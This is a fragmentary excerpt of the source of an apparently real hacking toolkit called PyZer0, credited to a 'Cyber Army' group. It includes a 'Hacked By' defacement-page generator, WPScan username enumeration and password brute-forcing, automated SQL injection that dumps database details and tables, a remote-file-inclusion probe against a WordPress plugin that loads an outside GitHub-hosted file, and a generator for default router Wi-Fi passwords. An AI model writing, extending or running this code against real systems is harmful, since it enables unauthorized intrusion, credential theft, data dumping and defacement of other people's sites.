...
<head>
  ...
  <meta name=\"Author\" content=\"H0@X | Cancer Cyber Army\"/>
  <meta name=\"copyright\" content=\"H0@X | Cancer Cyber Army\"/>
  <meta name=\"description\" content=\"{2}.\"/> <!-- Change this -->
  <meta name=\"keywords\" content=\"Hacked, Pawned, Defaced, Security, Cancer Cyber Army, H0@X, PyZer0\"/> <!-- Change this -->
  <meta property=\"og:title\" content=\"Hacked By {0}\"/>
  <meta property=\"og:image\" content=\"{3}\"> <!-- Change this -->

  <style>
  {9} url(\"https://alexzxc.com/pyzero.css\");
  </style>
</head>
<body>
  <div class=\"bg\">
...
sudo apt-get install wpscan""")
        ...
        if platform.system() == 'Windows':
            ...
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_user_range = str(input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_user_range = str(raw_input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            try:
...
sudo apt-get install wpscan""")
        ...
        if platform.system() == 'Windows':
            ...
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_brutefoce_username = str(input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_brutefoce_username = str(raw_input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(raw_input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            try:
    ...
    def auto_sql_injection(self, url):
        ...
        if auto_sql_injection_request_result == 'Vulnerable1':
            ...
            for i in auto_sql_injection_request_vulncolumn_possible_vulncolumn:
                ...
                if 'Table:' in auto_sql_injection_request_dios.text and 'id="PyZer0"' in auto_sql_injection_request_dios.text:
            ...
            sqli_hostname = sqli_hostname_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_tmpdir = sqli_tmpdir_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_datadir = sqli_datadir_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_version = sqli_version_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_basedir = sqli_basedir_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_user = sqli_user_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_database = sqli_database_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_schema = sqli_schema_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_uuid = sqli_uuid_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_system_user = sqli_system_user_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_session_user = sqli_session_user_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_symlink = sqli_symlink_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            sqli_ssl = sqli_ssl_soup.find('strong', attrs={'id': 'PyZer0INFO'}).text
            ...
            auto_sql_injection_request_dios_soup_PyZer0 = auto_sql_injection_request_dios_soup.findAll('strong', attrs={'id': 'PyZer0'})
            auto_sql_injection_request_dios_soup_PyZer0_list = []
            for i in auto_sql_injection_request_dios_soup_PyZer0:
                if i.text in auto_sql_injection_request_dios_soup_PyZer0_list:
                    pass
                else:
                    auto_sql_injection_request_dios_soup_PyZer0_list.append(i.text)
            for i in auto_sql_injection_request_dios_soup_PyZer0_list:
                print ('\t{0}'.format(i))
            print ('')
            sqli_table = ''
            user_choice = ''
            ...
            for i in sqli_column:
                ...
                auto_sql_injection_request_column_dump_soup_PyZer0 = auto_sql_injection_request_column_dump_soup.find_all('strong', attrs={'id': 'PyZer0INFO'})
                for ii in auto_sql_injection_request_column_dump_soup_PyZer0:
    ...
    def wordpress_vulnerability_check(self, wvc_url):
        ...
        if wp_plugin_wp_spritz.status_code == 200:
            wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/alekszxc1337/PyZer0/master/l33t/rfi.txt')
            wp_plugin_wp_spritz_wvc_url = wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/alekszxc1337/PyZer0/master/l33t/rfi.txt'
            if 'PyZer0 RFI ~Alekszxc1337' in wp_plugin_wp_spritz.text:
...
╚═╝        ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
     ...
     {2}--={3}[ {0}{5}Author: H0@X                 {3}]{2}=--
| {2}-- --={3}[ {0}{5}Website: https://alexzxc.com {3}]{2}=-- -- {4}|
{0}
...
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PyZer0{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))
        ...
        try:
            choice = int(raw_input('{0}PyZer0{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
    ...
    if choice == 1:
        ...
        print (reset + bold)
        if sys.version_info[0] == 3:
            title = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))
            shortcut_icon = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))
            meta_description = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))
            meta_image = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))
            logo = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))
            hacker_name = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))
            message1 = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))
            message2 = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))
            groups = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))
            deface_page_output_filename = str(input('{0}PyZer0{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            title = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Title{1})> {2}'.format(green, blue, cyan, red)))
            shortcut_icon = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Shortcut Icon{1})> {2}'.format(green, blue, cyan, red)))
            meta_description = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Meta Description{1})> {2}'.format(green, blue, cyan, red)))
            meta_image = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Meta Image{1})> {2}'.format(green, blue, cyan, red)))
            logo = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Logo{1})> {2}'.format(green, blue, cyan, red)))
            hacker_name = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Hacker Name{1})> {2}'.format(green, blue, cyan, red)))
            message1 = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Message 1{1})> {2}'.format(green, blue, cyan, red)))
            message2 = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Message 2{1})> {2}'.format(green, blue, cyan, red)))
            groups = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Group/s{1})> {2}'.format(green, blue, cyan, red)))
            deface_page_output_filename = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>({3}Output Filename{1})> {2}'.format(green, blue, cyan, red)))
        ...
        if sys.version_info[0] == 3:
            length = int(input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))
            text = str(input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            length = int(raw_input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Length{1})> {2}'.format(green, blue, cyan, red)))
            text = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        ...
        if sys.version_info[0] == 3:
            ...
            digit5 = str(input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))
            ...
            mac5 = str(input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            print ('{2}[{1}#{2}] {3}- {4}Last 5 Numbers if any. EX: PLDTHOMEDSLXXXXX where X is the number{0}'.format(reset, green, blue, yellow, cyan))
            digit5 = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 Digit{1})> {2}'.format(green, blue, cyan, red)))
            print ('{2}[{1}#{2}] {3}- {4}Last 5 MAC Characters. EX: 00:4a:00:d0:44:c0 where 044C0 is the last 5 MAC Characters{0}'.format(reset, green, blue, yellow, cyan))
            mac5 = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>{0}PasswordGenerator{1}>({3}Last 5 MAC Char{1})> {2}'.format(green, blue, cyan, red)))
        ...
        if sys.version_info[0] == 3:
            text = str(input('{0}PyZer0{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            text = str(raw_input('{0}PyZer0{1}>{0}Generator{1}>{0}TextToHash{1}>({3}Text{1})> {2}'.format(green, blue, cyan, red)))
...
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PyZer0{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
        ...
        try:
            choice = int(raw_input('{0}PyZer0{1}({3}WebApplicationAttack{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
    ...
    {0}""".format(reset, red, green, blue, yellow, cyan))
        if sys.version_info[0] == 3:
            try:
                choice1 = int(input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            except ValueError:
            ...
            try:
                choice1 = int(raw_input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>({3}Wordpress{1})> {2}'.format(green, blue, cyan, red)))
            except KeyboardInterrupt:
                print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
                sys.exit()
            except ValueError:
        ...
        if choice1 == 1:
            ...
            if sys.version_info[0] == 3:
                target = str(input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
            if sys.version_info[0] == 2:
                target = str(raw_input('{0}PyZer0{1}>{0}WebApplicationAttack{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
            set_target(target, 2)
        elif choice1 == 99:
            print ('\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
...
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PyZer0{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            try:
        ...
        try:
            choice = int(raw_input('{0}PyZer0{1}({3}WebPentest{1})> {2}'.format(green, blue, cyan, red)))
        except KeyboardInterrupt:
            try:
                print ('\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)
            except:
    ...
    if choice == 1:
        ...
        if sys.version_info[0] == 3:
            port_end = int(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            port_end = int(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}PortScan{1}>({3}Port End{1})> {2}'.format(green, blue, cyan, red)))
        try:
        ...
        if sys.version_info[0] == 3:
            subdomain_list = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            subdomain_list = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}SubdomainScan{1}>({3}Subdomain List{1})> {2}'.format(green, blue, cyan, red)))
        try:
        ...
        if sys.version_info[0] == 3:
            subnet_input = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            subnet_input = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}SubnetLookup{1}>({3}CIDR or IP with NetMask{1})> {2}'.format(green, blue, cyan, red)))
        try:
        ...
        if sys.version_info[0] == 3:
            directory_list = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            directory_list = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))
        try:
        ...
        if sys.version_info[0] == 3:
            file_list = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            file_list = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))
        try:
        ...
        if sys.version_info[0] == 3:
            shodan_search_query = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_search_output_filename = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
        ...
        if sys.version_info[0] == 2:
            shodan_search_query = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_search_output_filename = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_search_output_filename:
                shodan_search_output_filename = shodan_search_output_filename + '.txt'
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n""".format(i['timestamp'], i['ip_str'], str(i['port']), i['os'], i['hostnames'], i['data'], blue, green, yellow, cyan, reset))
        ...
        if sys.version_info[0] == 3:
            shodan_host = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_host_lookup_output_filename = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
        ...
        if sys.version_info[0] == 2:
            shodan_host = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))
            SHODAN_API_KEY = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))
            shodan_host_lookup_output_filename = str(input('{0}PyZer0{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))
            if '.txt' not in shodan_host_lookup_output_filename:
                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename + '.txt'
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n""".format(reset, blue, green, yellow, cyan, i['timestamp'], i['port'], i['transport'], i['data']))
        ...
        print ('{2}[{1}#{2}] {3}- {4}Please don\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))
        if sys.version_info[0] == 3:
            target = str(input('{0}PyZer0{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        if sys.version_info[0] == 2:
            target = str(raw_input('{0}PyZer0{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))
        if '://' in target:
...
{0}""".format(reset, red, green, blue, yellow, cyan))
    if sys.version_info[0] == 3:
        try:
            choice = int(input('{0}PyZer0{1}> {2}'.format(green, blue, cyan)))
        except KeyboardInterrupt:
            print ('\n\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
        ...
        try:
            choice = int(raw_input('{0}PyZer0{1}> {2}'.format(green, blue, cyan)))
        except KeyboardInterrupt:
            print ('\n\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))
            sys.exit()
        except ValueError:
